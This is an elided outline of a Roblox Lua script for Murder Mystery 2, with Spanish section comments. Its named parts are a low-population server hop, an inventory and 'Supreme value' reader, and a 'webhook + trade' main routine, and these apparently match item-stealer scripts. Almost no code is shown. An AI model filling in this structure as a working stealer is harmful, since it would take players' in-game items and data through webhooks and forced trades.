...
local function TeleportToLowPlayerServer()
    ...
    while true do
        ...
        for _, server in pairs(servers) do
            if server.playing <= 8 and server.playing > 0 and server.id ~= game.JobId then
...
-- =====================================
-- FUNCION PRINCIPAL (INVENTARIO + WEBHOOK + TRADE)
-- =====================================
...
local function MainExecution()
    ...
    -- =====================================
    -- MM2 INVENTARIO Y SUPREME VALUE
    -- =====================================
...
-- =====================================
-- INICIAR SCRIPT: TELEPORT + EJECUCIÓN PRINCIPAL
-- =====================================
